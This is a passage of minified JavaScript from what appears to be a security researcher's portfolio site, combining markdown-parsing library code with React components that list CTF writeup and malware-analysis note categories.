rules with repetition `"+t+"` for `options.ruleRepetition`, expected `3` or more");return t}function PS(e,t,n){let r=(SS(n)+(n.options.ruleSpaces?` `:``)).repeat(NS(n));return n.options.ruleSpaces?r.slice(0,-1):r}var FS={blockquote:Vx,break:Gx,code:Yx,definition:Qx,emphasis:nS,hardBreak:Gx,heading:aS,html:oS,image:cS,imageReference:uS,inlineCode:fS,link:hS,linkReference:_S,list:CS,listItem:TS,paragraph:ES,root:OS,strong:AS,text:MS,thematicBreak:PS};function IS(){return{enter:{table:LS,tableData:VS,tableHeader:VS,tableRow:zS},exit:{codeText:HS,table:RS,tableData:BS,tableHeader:BS,tableRow:BS}}}function LS(e){let t=e._align;this.enter({type:`table`,align:t.map(function(e){return e===`none`?null:e}),children:[]},e),this.data.inTable=!0}function RS(e){this.exit(e),this.data.inTable=void 0}function zS(e){this.enter({type:`tableRow`,children:[]},e)}function BS(e){this.exit(e)}function VS(e){this.enter({type:`tableCell`,children:[]},e)}function HS(e){let t=this.resume();this.data.inTable&&(t=t.replace(/\\([\\|])/g,US));let n=this.stack[this.stack.length-1];n.type,n.value=t,this.exit(e)}function US(e,t){return t===`|`?t:e}function WS(e){let t=e||{},n=t.tableCellPadding,r=t.tablePipeAlign,i=t.stringLength,a=n?` `:`|`;return{unsafe:[{character:`\r`,inConstruct:`tableCell`},{character:`
`,inConstruct:`tableCell`},{atBreak:!0,character:`|`,after:`[	 :-]`},{character:`|`,inConstruct:`tableCell`},{atBreak:!0,character:`:`,after:`-`},{atBreak:!0,character:`-`,after:`[:|-]`}],handlers:{inlineCode:f,table:o,tableCell:c,tableRow:s}};function o(e,t,n,r){return l(u(e,n,r),e.align)}function s(e,t,n,r){let i=l([d(e,n,r)]);return i.slice(0,i.indexOf(`
`))}function c(e,t,n,r){let i=n.enter(`tableCell`),o=n.enter(`phrasing`),s=n.containerPhrasing(e,{...r,before:a,after:a});return o(),i(),s}function l(e,t){return Rx(e,{align:t,alignDelimiters:r,padding:n,stringLength:i})}function u(e,t,n){let r=e.children,i=-1,a=[],o=t.enter(`table`);for(;++i<r.length;)a[i]=d(r[i],t,n);return o(),a}function d(e,t,n){let r=e.children,i=-1,a=[],o=t.enter(`tableRow`);for(;++i<r.length;)a[i]=c(r[i],e,t,n);return o(),a}function f(e,t,n){let r=FS.inlineCode(e,t,n);return n.stack.includes(`tableCell`)&&(r=r.replace(/\|/g,`\\$&`)),r}}function GS(){return{exit:{taskListCheckValueChecked:qS,taskListCheckValueUnchecked:qS,paragraph:JS}}}function KS(){return{unsafe:[{atBreak:!0,character:`-`,after:`[:|-]`}],handlers:{listItem:YS}}}function qS(e){let t=this.stack[this.stack.length-2];t.type,t.checked=e.type===`taskListCheckValueChecked`}function JS(e){let t=this.stack[this.stack.length-2];if(t&&t.type===`listItem`&&typeof t.checked==`boolean`){let e=this.stack[this.stack.length-1];e.type;let n=e.children[0];if(n&&n.type===`text`){let r=t.children,i=-1,a;for(;++i<r.length;){let e=r[i];if(e.type===`paragraph`){a=e;break}}a===e&&(n.value=n.value.slice(1),n.value.length===0?e.children.shift():e.position&&n.position&&typeof n.position.start.offset==`number`&&(n.position.start.column++,n.position.start.offset++,e.position.start=Object.assign({},n.position.start)))}}this.exit(e)}function YS(e,t,n,r){let i=e.children[0],a=typeof e.checked==`boolean`&&i&&i.type===`paragraph`,o=`[`+(e.checked?`x`:` `)+`] `,s=n.createTracker(r);a&&s.move(o);let c=FS.listItem(e,t,n,{...r,...s.current()});return a&&(c=c.replace(/^(?:[*+-]|\d+\.)([\r\n]| {1,3})/,l)),c;function l(e){return e+o}}function XS(){return[nx(),Ex(),jx(),IS(),GS()]}function ZS(e){return{extensions:[rx(),Dx(e),Mx(),WS(e),KS()]}}var QS={tokenize:fC,partial:!0},$S={tokenize:pC,partial:!0},eC={tokenize:mC,partial:!0},tC={tokenize:hC,partial:!0},nC={tokenize:gC,partial:!0},rC={name:`wwwAutolink`,tokenize:uC,previous:_C},iC={name:`protocolAutolink`,tokenize:dC,previous:vC},aC={name:`emailAutolink`,tokenize:lC,previous:yC},oC={};function sC(){return{text:oC}}for(var cC=48;cC<123;)oC[cC]=aC,cC++,cC===58?cC=65:cC===91&&(cC=97);oC[43]=aC,oC[45]=aC,oC[46]=aC,oC[95]=aC,oC[72]=[aC,iC],oC[104]=[aC,iC],oC[87]=[aC,rC],oC[119]=[aC,rC];function lC(e,t,n){let r=this,i,a;return o;function o(t){return!bC(t)||!yC.call(r,r.previous)||xC(r.events)?n(t):(e.enter(`literalAutolink`),e.enter(`literalAutolinkEmail`),s(t))}function s(t){return bC(t)?(e.consume(t),s):t===64?(e.consume(t),c):n(t)}function c(t){return t===46?e.check(nC,u,l)(t):t===45||t===95||ag(t)?(a=!0,e.consume(t),c):u(t)}function l(t){return e.consume(t),i=!0,c}function u(o){return a&&i&&ig(r.previous)?(e.exit(`literalAutolinkEmail`),e.exit(`literalAutolink`),t(o)):n(o)}}function uC(e,t,n){let r=this;return i;function i(t){return t!==87&&t!==119||!_C.call(r,r.previous)||xC(r.events)?n(t):(e.enter(`literalAutolink`),e.enter(`literalAutolinkWww`),e.check(QS,e.attempt($S,e.attempt(eC,a),n),n)(t))}function a(n){return e.exit(`literalAutolinkWww`),e.exit(`literalAutolink`),t(n)}}function dC(e,t,n){let r=this,i=``,a=!1;return o;function o(t){return(t===72||t===104)&&vC.call(r,r.previous)&&!xC(r.events)?(e.enter(`literalAutolink`),e.enter(`literalAutolinkHttp`),i+=String.fromCodePoint(t),e.consume(t),s):n(t)}function s(t){if(ig(t)&&i.length<5)return i+=String.fromCodePoint(t),e.consume(t),s;if(t===58){let n=i.toLowerCase();if(n===`http`||n===`https`)return e.consume(t),c}return n(t)}function c(t){return t===47?(e.consume(t),a?l:(a=!0,c)):n(t)}function l(t){return t===null||sg(t)||dg(t)||pg(t)||fg(t)?n(t):e.attempt($S,e.attempt(eC,u),n)(t)}function u(n){return e.exit(`literalAutolinkHttp`),e.exit(`literalAutolink`),t(n)}}function fC(e,t,n){let r=0;return i;function i(t){return(t===87||t===119)&&r<3?(r++,e.consume(t),i):t===46&&r===3?(e.consume(t),a):n(t)}function a(e){return e===null?n(e):t(e)}}function pC(e,t,n){let r,i,a;return o;function o(t){return t===46||t===95?e.check(tC,c,s)(t):t===null||dg(t)||pg(t)||t!==45&&fg(t)?c(t):(a=!0,e.consume(t),o)}function s(t){return t===95?r=!0:(i=r,r=void 0),e.consume(t),o}function c(e){return i||r||!a?n(e):t(e)}}function mC(e,t){let n=0,r=0;return i;function i(o){return o===40?(n++,e.consume(o),i):o===41&&r<n?a(o):o===33||o===34||o===38||o===39||o===41||o===42||o===44||o===46||o===58||o===59||o===60||o===63||o===93||o===95||o===126?e.check(tC,t,a)(o):o===null||dg(o)||pg(o)?t(o):(e.consume(o),i)}function a(t){return t===41&&r++,e.consume(t),i}}function hC(e,t,n){return r;function r(o){return o===33||o===34||o===39||o===41||o===42||o===44||o===46||o===58||o===59||o===63||o===95||o===126?(e.consume(o),r):o===38?(e.consume(o),a):o===93?(e.consume(o),i):o===60||o===null||dg(o)||pg(o)?t(o):n(o)}function i(e){return e===null||e===40||e===91||dg(e)||pg(e)?t(e):r(e)}function a(e){return ig(e)?o(e):n(e)}function o(t){return t===59?(e.consume(t),r):ig(t)?(e.consume(t),o):n(t)}}function gC(e,t,n){return r;function r(t){return e.consume(t),i}function i(e){return ag(e)?n(e):t(e)}}function _C(e){return e===null||e===40||e===42||e===95||e===91||e===93||e===126||dg(e)}function vC(e){return!ig(e)}function yC(e){return!(e===47||bC(e))}function bC(e){return e===43||e===45||e===46||e===95||ag(e)}function xC(e){let t=e.length,n=!1;for(;t--;){let r=e[t][1];if((r.type===`labelLink`||r.type===`labelImage`)&&!r._balanced){n=!0;break}if(r._gfmAutolinkLiteralWalkedInto){n=!1;break}}return e.length>0&&!n&&(e[e.length-1][1]._gfmAutolinkLiteralWalkedInto=!0),n}var SC={tokenize:AC,partial:!0};function CC(){return{document:{91:{name:`gfmFootnoteDefinition`,tokenize:DC,continuation:{tokenize:OC},exit:kC}},text:{91:{name:`gfmFootnoteCall`,tokenize:EC},93:{name:`gfmPotentialFootnoteCall`,add:`after`,tokenize:wC,resolveTo:TC}}}}function wC(e,t,n){let r=this,i=r.events.length,a=r.parser.gfmFootnotes||(r.parser.gfmFootnotes=[]),o;for(;i--;){let e=r.events[i][1];if(e.type===`labelImage`){o=e;break}if(e.type===`gfmFootnoteCall`||e.type===`labelLink`||e.type===`label`||e.type===`image`||e.type===`link`)break}return s;function s(i){if(!o||!o._balanced)return n(i);let s=rg(r.sliceSerialize({start:o.end,end:r.now()}));return s.codePointAt(0)!==94||!a.includes(s.slice(1))?n(i):(e.enter(`gfmFootnoteCallLabelMarker`),e.consume(i),e.exit(`gfmFootnoteCallLabelMarker`),t(i))}}function TC(e,t){let n=e.length;for(;n--;)if(e[n][1].type===`labelImage`&&e[n][0]===`enter`){e[n][1];break}e[n+1][1].type=`data`,e[n+3][1].type=`gfmFootnoteCallLabelMarker`;let r={type:`gfmFootnoteCall`,start:Object.assign({},e[n+3][1].start),end:Object.assign({},e[e.length-1][1].end)},i={type:`gfmFootnoteCallMarker`,start:Object.assign({},e[n+3][1].end),end:Object.assign({},e[n+3][1].end)};i.end.column++,i.end.offset++,i.end._bufferIndex++;let a={type:`gfmFootnoteCallString`,start:Object.assign({},i.end),end:Object.assign({},e[e.length-1][1].start)},o={type:`chunkString`,contentType:`string`,start:Object.assign({},a.start),end:Object.assign({},a.end)},s=[e[n+1],e[n+2],[`enter`,r,t],e[n+3],e[n+4],[`enter`,i,t],[`exit`,i,t],[`enter`,a,t],[`enter`,o,t],[`exit`,o,t],[`exit`,a,t],e[e.length-2],e[e.length-1],[`exit`,r,t]];return e.splice(n,e.length-n+1,...s),e}function EC(e,t,n){let r=this,i=r.parser.gfmFootnotes||(r.parser.gfmFootnotes=[]),a=0,o;return s;function s(t){return e.enter(`gfmFootnoteCall`),e.enter(`gfmFootnoteCallLabelMarker`),e.consume(t),e.exit(`gfmFootnoteCallLabelMarker`),c}function c(t){return t===94?(e.enter(`gfmFootnoteCallMarker`),e.consume(t),e.exit(`gfmFootnoteCallMarker`),e.enter(`gfmFootnoteCallString`),e.enter(`chunkString`).contentType=`string`,l):n(t)}function l(s){if(a>999||s===93&&!o||s===null||s===91||dg(s))return n(s);if(s===93){e.exit(`chunkString`);let a=e.exit(`gfmFootnoteCallString`);return i.includes(rg(r.sliceSerialize(a)))?(e.enter(`gfmFootnoteCallLabelMarker`),e.consume(s),e.exit(`gfmFootnoteCallLabelMarker`),e.exit(`gfmFootnoteCall`),t):n(s)}return dg(s)||(o=!0),a++,e.consume(s),s===92?u:l}function u(t){return t===91||t===92||t===93?(e.consume(t),a++,l):l(t)}}function DC(e,t,n){let r=this,i=r.parser.gfmFootnotes||(r.parser.gfmFootnotes=[]),a,o=0,s;return c;function c(t){return e.enter(`gfmFootnoteDefinition`)._container=!0,e.enter(`gfmFootnoteDefinitionLabel`),e.enter(`gfmFootnoteDefinitionLabelMarker`),e.consume(t),e.exit(`gfmFootnoteDefinitionLabelMarker`),l}function l(t){return t===94?(e.enter(`gfmFootnoteDefinitionMarker`),e.consume(t),e.exit(`gfmFootnoteDefinitionMarker`),e.enter(`gfmFootnoteDefinitionLabelString`),e.enter(`chunkString`).contentType=`string`,u):n(t)}function u(t){if(o>999||t===93&&!s||t===null||t===91||dg(t))return n(t);if(t===93){e.exit(`chunkString`);let n=e.exit(`gfmFootnoteDefinitionLabelString`);return a=rg(r.sliceSerialize(n)),e.enter(`gfmFootnoteDefinitionLabelMarker`),e.consume(t),e.exit(`gfmFootnoteDefinitionLabelMarker`),e.exit(`gfmFootnoteDefinitionLabel`),f}return dg(t)||(s=!0),o++,e.consume(t),t===92?d:u}function d(t){return t===91||t===92||t===93?(e.consume(t),o++,u):u(t)}function f(t){return t===58?(e.enter(`definitionMarker`),e.consume(t),e.exit(`definitionMarker`),i.includes(a)||i.push(a),$(e,p,`gfmFootnoteDefinitionWhitespace`)):n(t)}function p(e){return t(e)}}function OC(e,t,n){return e.check(Ag,t,e.attempt(SC,t,n))}function kC(e){e.exit(`gfmFootnoteDefinition`)}function AC(e,t,n){let r=this;return $(e,i,`gfmFootnoteDefinitionIndent`,5);function i(e){let i=r.events[r.events.length-1];return i&&i[1].type===`gfmFootnoteDefinitionIndent`&&i[2].sliceSerialize(i[1],!0).length===4?t(e):n(e)}}function jC(e){let t=(e||{}).singleTilde,n={name:`strikethrough`,tokenize:i,resolveAll:r};return t??=!0,{text:{126:n},insideSpan:{null:[n]},attentionMarkers:{null:[126]}};function r(e,t){let n=-1;for(;++n<e.length;)if(e[n][0]===`enter`&&e[n][1].type===`strikethroughSequenceTemporary`&&e[n][1]._close){let r=n;for(;r--;)if(e[r][0]===`exit`&&e[r][1].type===`strikethroughSequenceTemporary`&&e[r][1]._open&&e[n][1].end.offset-e[n][1].start.offset===e[r][1].end.offset-e[r][1].start.offset){e[n][1].type=`strikethroughSequence`,e[r][1].type=`strikethroughSequence`;let i={type:`strikethrough`,start:Object.assign({},e[r][1].start),end:Object.assign({},e[n][1].end)},a={type:`strikethroughText`,start:Object.assign({},e[r][1].end),end:Object.assign({},e[n][1].start)},o=[[`enter`,i,t],[`enter`,e[r][1],t],[`exit`,e[r][1],t],[`enter`,a,t]],s=t.parser.constructs.insideSpan.null;s&&Xh(o,o.length,0,Cg(s,e.slice(r+1,n),t)),Xh(o,o.length,0,[[`exit`,a,t],[`enter`,e[n][1],t],[`exit`,e[n][1],t],[`exit`,i,t]]),Xh(e,r-1,n-r+3,o),n=r+o.length-2;break}}for(n=-1;++n<e.length;)e[n][1].type===`strikethroughSequenceTemporary`&&(e[n][1].type=`data`);return e}function i(e,n,r){let i=this.previous,a=this.events,o=0;return s;function s(t){return i===126&&a[a.length-1][1].type!==`characterEscape`?r(t):(e.enter(`strikethroughSequenceTemporary`),c(t))}function c(a){let s=Sg(i);if(a===126)return o>1?r(a):(e.consume(a),o++,c);if(o<2&&!t)return r(a);let l=e.exit(`strikethroughSequenceTemporary`),u=Sg(a);return l._open=!u||u===2&&!!s,l._close=!s||s===2&&!!u,n(a)}}}var MC=class{constructor(){this.map=[]}add(e,t,n){NC(this,e,t,n)}consume(e){if(this.map.sort(function(e,t){return e[0]-t[0]}),this.map.length===0)return;let t=this.map.length,n=[];for(;t>0;)--t,n.push(e.slice(this.map[t][0]+this.map[t][1]),this.map[t][2]),e.length=this.map[t][0];n.push(e.slice()),e.length=0;let r=n.pop();for(;r;){for(let t of r)e.push(t);r=n.pop()}this.map.length=0}};function NC(e,t,n,r){let i=0;if(!(n===0&&r.length===0)){for(;i<e.map.length;){if(e.map[i][0]===t){e.map[i][1]+=n,e.map[i][2].push(...r);return}i+=1}e.map.push([t,n,r])}}function PC(e,t){let n=!1,r=[];for(;t<e.length;){let i=e[t];if(n){if(i[0]===`enter`)i[1].type===`tableContent`&&r.push(e[t+1][1].type===`tableDelimiterMarker`?`left`:`none`);else if(i[1].type===`tableContent`){if(e[t-1][1].type===`tableDelimiterMarker`){let e=r.length-1;r[e]=r[e]===`left`?`center`:`right`}}else if(i[1].type===`tableDelimiterRow`)break}else i[0]===`enter`&&i[1].type===`tableDelimiterRow`&&(n=!0);t+=1}return r}function FC(){return{flow:{null:{name:`table`,tokenize:IC,resolveAll:LC}}}}function IC(e,t,n){let r=this,i=0,a=0,o;return s;function s(e){let t=r.events.length-1;for(;t>-1;){let e=r.events[t][1].type;if(e===`lineEnding`||e===`linePrefix`)t--;else break}let i=t>-1?r.events[t][1].type:null,a=i===`tableHead`||i===`tableRow`?S:c;return a===S&&r.parser.lazy[r.now().line]?n(e):a(e)}function c(t){return e.enter(`tableHead`),e.enter(`tableRow`),l(t)}function l(e){return e===124?u(e):(o=!0,a+=1,u(e))}function u(t){return t===null?n(t):Z(t)?a>1?(a=0,r.interrupt=!0,e.exit(`tableRow`),e.enter(`lineEnding`),e.consume(t),e.exit(`lineEnding`),p):n(t):Q(t)?$(e,u,`whitespace`)(t):(a+=1,o&&(o=!1,i+=1),t===124?(e.enter(`tableCellDivider`),e.consume(t),e.exit(`tableCellDivider`),o=!0,u):(e.enter(`data`),d(t)))}function d(t){return t===null||t===124||dg(t)?(e.exit(`data`),u(t)):(e.consume(t),t===92?f:d)}function f(t){return t===92||t===124?(e.consume(t),d):d(t)}function p(t){return r.interrupt=!1,r.parser.lazy[r.now().line]?n(t):(e.enter(`tableDelimiterRow`),o=!1,Q(t)?$(e,m,`linePrefix`,r.parser.constructs.disable.null.includes(`codeIndented`)?void 0:4)(t):m(t))}function m(t){return t===45||t===58?g(t):t===124?(o=!0,e.enter(`tableCellDivider`),e.consume(t),e.exit(`tableCellDivider`),h):x(t)}function h(t){return Q(t)?$(e,g,`whitespace`)(t):g(t)}function g(t){return t===58?(a+=1,o=!0,e.enter(`tableDelimiterMarker`),e.consume(t),e.exit(`tableDelimiterMarker`),_):t===45?(a+=1,_(t)):t===null||Z(t)?b(t):x(t)}function _(t){return t===45?(e.enter(`tableDelimiterFiller`),v(t)):x(t)}function v(t){return t===45?(e.consume(t),v):t===58?(o=!0,e.exit(`tableDelimiterFiller`),e.enter(`tableDelimiterMarker`),e.consume(t),e.exit(`tableDelimiterMarker`),y):(e.exit(`tableDelimiterFiller`),y(t))}function y(t){return Q(t)?$(e,b,`whitespace`)(t):b(t)}function b(n){return n===124?m(n):n===null||Z(n)?!o||i!==a?x(n):(e.exit(`tableDelimiterRow`),e.exit(`tableHead`),t(n)):x(n)}function x(e){return n(e)}function S(t){return e.enter(`tableRow`),C(t)}function C(n){return n===124?(e.enter(`tableCellDivider`),e.consume(n),e.exit(`tableCellDivider`),C):n===null||Z(n)?(e.exit(`tableRow`),t(n)):Q(n)?$(e,C,`whitespace`)(n):(e.enter(`data`),w(n))}function w(t){return t===null||t===124||dg(t)?(e.exit(`data`),C(t)):(e.consume(t),t===92?T:w)}function T(t){return t===92||t===124?(e.consume(t),w):w(t)}}function LC(e,t){let n=-1,r=!0,i=0,a=[0,0,0,0],o=[0,0,0,0],s=!1,c=0,l,u,d,f=new MC;for(;++n<e.length;){let p=e[n],m=p[1];p[0]===`enter`?m.type===`tableHead`?(s=!1,c!==0&&(zC(f,t,c,l,u),u=void 0,c=0),l={type:`table`,start:Object.assign({},m.start),end:Object.assign({},m.end)},f.add(n,0,[[`enter`,l,t]])):m.type===`tableRow`||m.type===`tableDelimiterRow`?(r=!0,d=void 0,a=[0,0,0,0],o=[0,n+1,0,0],s&&(s=!1,u={type:`tableBody`,start:Object.assign({},m.start),end:Object.assign({},m.end)},f.add(n,0,[[`enter`,u,t]])),i=m.type===`tableDelimiterRow`?2:u?3:1):i&&(m.type===`data`||m.type===`tableDelimiterMarker`||m.type===`tableDelimiterFiller`)?(r=!1,o[2]===0&&(a[1]!==0&&(o[0]=o[1],d=RC(f,t,a,i,void 0,d),a=[0,0,0,0]),o[2]=n)):m.type===`tableCellDivider`&&(r?r=!1:(a[1]!==0&&(o[0]=o[1],d=RC(f,t,a,i,void 0,d)),a=o,o=[a[1],n,0,0])):m.type===`tableHead`?(s=!0,c=n):m.type===`tableRow`||m.type===`tableDelimiterRow`?(c=n,a[1]===0?o[1]!==0&&(d=RC(f,t,o,i,n,d)):(o[0]=o[1],d=RC(f,t,a,i,n,d)),i=0):i&&(m.type===`data`||m.type===`tableDelimiterMarker`||m.type===`tableDelimiterFiller`)&&(o[3]=n)}for(c!==0&&zC(f,t,c,l,u),f.consume(t.events),n=-1;++n<t.events.length;){let e=t.events[n];e[0]===`enter`&&e[1].type===`table`&&(e[1]._align=PC(t.events,n))}return e}function RC(e,t,n,r,i,a){let o=r===1?`tableHeader`:r===2?`tableDelimiter`:`tableData`;n[0]!==0&&(a.end=Object.assign({},BC(t.events,n[0])),e.add(n[0],0,[[`exit`,a,t]]));let s=BC(t.events,n[1]);if(a={type:o,start:Object.assign({},s),end:Object.assign({},s)},e.add(n[1],0,[[`enter`,a,t]]),n[2]!==0){let i=BC(t.events,n[2]),a=BC(t.events,n[3]),o={type:`tableContent`,start:Object.assign({},i),end:Object.assign({},a)};if(e.add(n[2],0,[[`enter`,o,t]]),r!==2){let r=t.events[n[2]],i=t.events[n[3]];if(r[1].end=Object.assign({},i[1].end),r[1].type=`chunkText`,r[1].contentType=`text`,n[3]>n[2]+1){let t=n[2]+1,r=n[3]-n[2]-1;e.add(t,r,[])}}e.add(n[3]+1,0,[[`exit`,o,t]])}return i!==void 0&&(a.end=Object.assign({},BC(t.events,i)),e.add(i,0,[[`exit`,a,t]]),a=void 0),a}function zC(e,t,n,r,i){let a=[],o=BC(t.events,n);i&&(i.end=Object.assign({},o),a.push([`exit`,i,t])),r.end=Object.assign({},o),a.push([`exit`,r,t]),e.add(n+1,0,a)}function BC(e,t){let n=e[t],r=n[0]===`enter`?`start`:`end`;return n[1][r]}var VC={name:`tasklistCheck`,tokenize:UC};function HC(){return{text:{91:VC}}}function UC(e,t,n){let r=this;return i;function i(t){return r.previous!==null||!r._gfmTasklistFirstContentOfListItem?n(t):(e.enter(`taskListCheck`),e.enter(`taskListCheckMarker`),e.consume(t),e.exit(`taskListCheckMarker`),a)}function a(t){return dg(t)?(e.enter(`taskListCheckValueUnchecked`),e.consume(t),e.exit(`taskListCheckValueUnchecked`),o):t===88||t===120?(e.enter(`taskListCheckValueChecked`),e.consume(t),e.exit(`taskListCheckValueChecked`),o):n(t)}function o(t){return t===93?(e.enter(`taskListCheckMarker`),e.consume(t),e.exit(`taskListCheckMarker`),e.exit(`taskListCheck`),s):n(t)}function s(r){return Z(r)?t(r):Q(r)?e.check({tokenize:WC},t,n)(r):n(r)}}function WC(e,t,n){return $(e,r,`whitespace`);function r(e){return e===null?n(e):t(e)}}function GC(e){return $h([sC(),CC(),jC(e),FC(),HC()])}var KC={};function qC(e){let t=this,n=e||KC,r=t.data(),i=r.micromarkExtensions||=[],a=r.fromMarkdownExtensions||=[],o=r.toMarkdownExtensions||=[];i.push(GC(n)),a.push(XS()),o.push(ZS(n))}function JC({isOpen:e,onClose:t,title:n,content:r,category:i}){return(0,G.jsx)(K,{children:e&&(0,G.jsx)(xp.div,{initial:{opacity:0},animate:{opacity:1},exit:{opacity:0},transition:{duration:.2},className:`fixed inset-0 z-[100] flex items-start justify-center overflow-y-auto p-4 pt-20 pb-10`,style:{backgroundColor:`rgba(0,0,0,0.6)`,backdropFilter:`blur(4px)`},onClick:t,children:(0,G.jsxs)(xp.div,{initial:{opacity:0,scale:.95,y:20},animate:{opacity:1,scale:1,y:0},exit:{opacity:0,scale:.95,y:20},transition:{duration:.3,ease:`easeOut`},className:`rounded-2xl w-full max-w-4xl shadow-2xl border border-border dark:border-dm-border bg-body dark:bg-dm-body`,onClick:e=>e.stopPropagation(),children:[(0,G.jsxs)(`div`,{className:`flex items-center justify-between px-6 py-4 border-b border-border dark:border-dm-border`,children:[(0,G.jsxs)(`div`,{children:[(0,G.jsx)(`span`,{className:`category-badge`,children:i}),(0,G.jsx)(`h2`,{className:`text-xl font-bold mt-2 text-dark dark:text-white`,children:n})]}),(0,G.jsx)(`button`,{onClick:t,className:`p-2 rounded-lg transition-colors text-light hover:text-dark dark:hover:text-white`,children:(0,G.jsx)(em,{size:20})})]}),(0,G.jsx)(`div`,{className:`content px-6 py-6 max-h-[70vh] overflow-y-auto`,children:(0,G.jsx)(Ub,{remarkPlugins:[qC],children:r})})]})})})}function YC({category:e,size:t=40,className:n=`text-primary`,style:r}){let i={size:t,className:n,style:r};switch(e){case`Malware Analysis`:return(0,G.jsx)(Kp,{...i});case`Binary Exploitation`:case`picoCTF - Binary Exploitation`:return(0,G.jsx)(Ap,{...i});case`Reverse Engineering`:case`picoCTF - Reverse Engineering`:return(0,G.jsx)(Mp,{...i});case`HTB Writeup`:return(0,G.jsx)(qp,{...i});case`CTF Writeup`:return(0,G.jsx)(Qp,{...i});case`picoCTF - Web Exploitation`:return(0,G.jsx)(Bp,{...i});case`picoCTF - General Skills`:return(0,G.jsx)(Zp,{...i});case`picoCTF - Blockchain`:return(0,G.jsx)(Hp,{...i});default:return(0,G.jsx)(jp,{...i})}}var XC={"Malware Analysis":Kp,"Binary Exploitation":Ap,"Reverse Engineering":Mp,"HTB Writeup":qp,"CTF Writeup":Qp,Resources:jp,"picoCTF - Binary Exploitation":Ap,"picoCTF - Reverse Engineering":Mp,"picoCTF - Web Exploitation":Bp,"picoCTF - General Skills":Zp,"picoCTF - Blockchain":Hp},ZC={"Malware Analysis":`#14b8a6`,"Binary Exploitation":`#f59e0b`,"Reverse Engineering":`#8b5cf6`,"HTB Writeup":`#84cc16`,"CTF Writeup":`#ef4444`,Resources:`#0ea5e9`,"picoCTF - Binary Exploitation":`#f97316`,"picoCTF - Reverse Engineering":`#a855f7`,"picoCTF - Web Exploitation":`#06b6d4`,"picoCTF - General Skills":`#22c55e`,"picoCTF - Blockchain":`#eab308`};function QC(e){return XC[e]||jp}function $C(e){return ZC[e]||`#0f9f8f`}var ew=[`htb-facts-writeup`,`htb-wingdata-writeup`,`advanced-static-ana`,`binary-exploitation-methodology`,`reentrance`,`hashgate`].map(e=>rm.find(t=>t.id===e)).filter(Boolean),tw=[{title:`Malware Static Analysis`,category:`Malware Analysis`,detail:`From hashes and strings to PE structure, suspicious APIs, and injection patterns.`},{title:`Binary Exploitation Lab`,category:`Binary Exploitation`,detail:`A repeatable pwn workflow covering stack, heap, ROP, format strings, and tooling.`},{title:`picoCTF 2026 Sprint`,category:`picoCTF - Reverse Engineering`,detail:`A broad set of solved web, blockchain, pwn, RE, and general skills challenges.`}];function nw(){let[e,t]=(0,w.useState)(null),n=rm.find(t=>t.id===e);return(0,G.jsxs)(G.Fragment,{children:[(0,G.jsxs)(`section`,{className:`section`,children:[(0,G.jsxs)(`div`,{className:`section-heading`,children:[(0,G.jsx)(`span`,{className:`eyebrow text-primary dark:text-dm-primary`,children:`Field Notes`}),(0,G.jsx)(`h2`,{className:`mt-3 text-3xl font-bold sm:text-4xl`,children:`Featured Work From The Vault`}),(0,G.jsx)(`p`,{className:`mt-4 max-w-2xl text-text dark:text-dm-text`,children:`The archive is organized around practical security work: reversing binaries, documenting attack chains, preserving tools, and turning challenge solves into reusable technique notes.`})]}),(0,G.jsx)(`div`,{className:`mt-10 grid gap-5 lg:grid-cols-2`,children:ew.map((e,n)=>(0,G.jsxs)(xp.button,{type:`button`,initial:{opacity:0,y:20},whileInView:{opacity:1,y:0},viewport:{once:!0},transition:{delay:n*.04},className:`note-card text-left`,onClick:()=>t(e.id),children:[(0,G.jsxs)(`div`,{className:`flex items-start gap-4`,children:[(0,G.jsx)(`div`,{className:`note-icon`,style:{"--accent":$C(e.category)},children:(0,G.jsx)(YC,{category:e.category,size:24,className:`text-white`})}),(0,G.jsxs)(`div`,{className:`min-w-0`,children:[(0,G.jsx)(`span`,{className:`category-badge`,children:e.category}),(0,G.jsx)(`h3`,{className:`mt-3 text-xl font-bold text-dark dark:text-white`,children:e.title}),(0,G.jsx)(`p`,{className:`mt-3 text-sm leading-7 text-text dark:text-dm-text`,children:e.excerpt})]})]}),(0,G.jsxs)(`div`,{className:`mt-5 flex flex-wrap items-center gap-4 text-xs font-bold uppercase tracking-[0.12em] text-light`,children:[(0,G.jsxs)(`span`,{className:`inline-flex items-center gap-2`,children:[(0,G.jsx)($p,{size:13}),`f4zzie`]}),(0,G.jsxs)(`span`,{className:`inline-flex items-center gap-2`,children:[(0,G.jsx)(Pp,{size:13}),`Research note`]})]})]},e.id))}),(0,G.jsx)(`div`,{className:`mt-8 grid gap-4 lg:grid-cols-3`,children:tw.map(e=>{let t=im.find(t=>t.name===e.category)?.count||0;return(0,G.jsxs)(`div`,{className:`track-card`,children:[(0,G.jsxs)(`div`,{className:`flex items-center justify-between gap-4`,children:[(0,G.jsx)(YC,{category:e.category,size:24,className:`text-primary dark:text-dm-primary`}),(0,G.jsxs)(`span`,{className:`text-sm font-bold text-dark dark:text-white`,children:[t,` notes`]})]}),(0,G.jsx)(`h3`,{className:`mt-4 text-lg font-bold`,children:e.title}),(0,G.jsx)(`p`,{className:`mt-2 text-sm leading-6 text-text dark:text-dm-text`,children:e.detail})]},e.title)})}),(0,G.jsxs)(`div`,{className:`mt-10 flex flex-wrap items-center justify-between gap-4 border-t border-border pt-6 dark:border-dm-border`,children:[(0,G.jsxs)(`div`,{className:`inline-flex items-center gap-2 text-sm font-bold text-dark dark:text-white`,children:[(0,G.jsx)(Vp,{size:18,className:`text-primary dark:text-dm-primary`}),rm.length,` notes across `,im.length,` categories`]}),(0,G.jsxs)(Tn,{to:`/notes`,className:`btn btn-outline-primary`,children:[`Open Archive`,(0,G.jsx)(kp,{size:16,className:`ml-2`})]})]})]}),n&&(0,G.jsx)(JC,{isOpen:!!e,onClose:()=>t(null),title:n.title,content:n.content,category:n.category})]})}function rw(){return(0,G.jsxs)(xp.div,{initial:{opacity:0},animate:{opacity:1},exit:{opacity:0},transition:{duration:.3},children:[(0,G.jsx)(dm,{}),(0,G.jsx)(`div`,{className:`container`,children:(0,G.jsx)(nw,{})})]})}var iw=[{icon:Lp,title:`Malware Static Analysis`,desc:`Hashing, strings, PE headers, Windows APIs, process injection patterns, and sandbox triage notes.`},{icon:Ap,title:`Binary Exploitation`,desc:`Stack and heap exploitation, ROP, format strings, protections, pwndbg, GDB, and pwntools templates.`},{icon:Mp,title:`Reverse Engineering`,desc:`Crackmes, hidden cipher challenges, instrumentation writeups, x86 assembly, Ghidra, Cutter, and x64dbg.`},{icon:Fp,title:`CTF Attack Chains`,desc:`picoCTF, HTB, THM, and CyberStudents writeups with commands, reasoning, and verification 